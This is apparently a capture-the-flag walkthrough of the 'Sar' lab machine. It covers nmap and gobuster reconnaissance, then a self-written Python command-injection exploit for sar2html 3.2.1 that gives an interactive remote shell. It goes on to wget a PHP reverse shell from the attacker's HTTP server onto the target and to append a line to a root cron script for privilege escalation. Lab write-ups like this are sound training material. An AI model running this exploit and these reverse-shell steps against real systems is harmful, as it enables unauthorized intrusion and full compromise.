# Sar

# 1 Information gathering
## 1.1 Discovery host
`nmap -Pn -F 192.168.196.1/24 -oN host_discovery.txt`
![42ab379f6a809ffe8484917aae278ebe.png](./_resources/7f72f5ad47394c36aab2a2a04e0849d3.png)


## 1.2 Service enum
`nmap -sV -sC -p- 192.168.196.131 -oN full_service_enum-sC.txt`
![99077d6337566a9dacfab871978e6f68.png](./_resources/ceac9e71650746b3b84bffa8119c058c.png)

`nmap -sV -sU -F  -oN udp-sC-sV.txt`

![b5040109f53646d85e2ba4b39ab82df1.png](./_resources/e22b29ee7b444b57abe4e663f9ac0a1a.png)

## 1.3 Web
### 1.3.1 Gobuster
`gobuster dir -u http://192.168.196.131 -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt -f -x php,bkp,bak,txt,html,aspx -o info.txt`

### 1.3.2 Robots.txt and Sar2html
![fefda24968698a6f7a9db52a94e6cd60.png](./_resources/d4db09a2e93e4504aecaf68778e4bc31.png)
![10734a64042b69ed98f6b07cf2684102.png](./_resources/936510b6e8f74c6b8af7146f059f0abe.png)

For this app there are public exploits, but let's code it.

# 2 Exploitation (Testing for Command Injection - WSTG-INPV-12)
## 2.2 Coded exploit to gain RCE
Firts we should know what point of the source code is vulnerable:
![2824569ae5baa951aacf73ee2dc796eb.png](./_resources/2b1aa54a0f5c49d283aba80292cc012c.png)
![ea782e47d8895a5985e6d0f4356bcef0.png](./_resources/b1c080a4aea34f0a9b6743cf8879b46b.png)

The variable `plot` receive as GET method and concatenated into php vulnerable exec function. The argument for this command must be sanitized

Code:
```
# Script para php command injection - sar2html Ver 3.2.1 - byth22
#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
import requests
import re


def command_(command):
    #target = "https://192.168.196.131"
    target = ""
    
    cookies = {
        'PHPSESSID': '',
    }

    headers = {
        'Host': '192.168.196.131',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
    }

    params = (
    ('plot', ';'+command),
    )

    try:
        response = requests.get(target+'/sar2HTML/index.php', headers=headers, params=params, cookies=cookies, verify=False)
    except:
        print ("Connection error!")
    
    try:
        receive = re.findall("<option value=(.*?)>", response.text)
    except:
        print ("Error!")
    
    for i in receive:
	    if "There is no defined host..." not in i:
		    if "null selected" not in i:
		        if "selected" not in i:
		            print (i)
def main():
    while True:
        command = raw_input("[+] Shell ->:  ")
        command_(command)


main()
```
![80d9ab120a31979e93af5cdcc8e1b5d8.png](./_resources/0953e5d9aa1b425da61ca422c4289beb.png)

## 2.2 PHP Reverse shell
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

Download and edit the php reverse shell for point your ip and port.

`python3 -m http.server 8090` <- on the platform

`wget http://192.168.196.121:8090/php-reverse-shell.php` <- on the target for rev shell download

Now you might execute it:
![c7908850dfc35583155688c7acffc4ec.png](./_resources/f7cca70b48754647a656cc9ba104f4af.png)
![974a4a55bd0d9d8186c7b86c52fd53ef.png](./_resources/12ac04997f3341c09a0ea8870ba5f323.png)


# 3 Post-exploitation (crontab abuse)
LinEnum.sh reveals some good information:
![ea46b5015f3eca4b40616d29dd23968c.png](./_resources/b01401b6ee2546cc83c2fb57fde3d8f4.png)
![5151113f8bd7b5dfaac69486e06e73e0.png](./_resources/a17774987f9349c4b8202d74fc6d4f02.png)

Let's edit write.sh file to gain shell:

`python3 -m http.server 8090` <- on the kali

`wget http://192.168.196.121:8090/php-reverse-shell.php` <- on the target

`echo "php ./php-reverse-shell.php" >> write.sh` <- on the target
![54a351a9644ded50d5cf9af4934e55cb.png](./_resources/d23c9d3441f24410827b583b35e0f9c1.png)
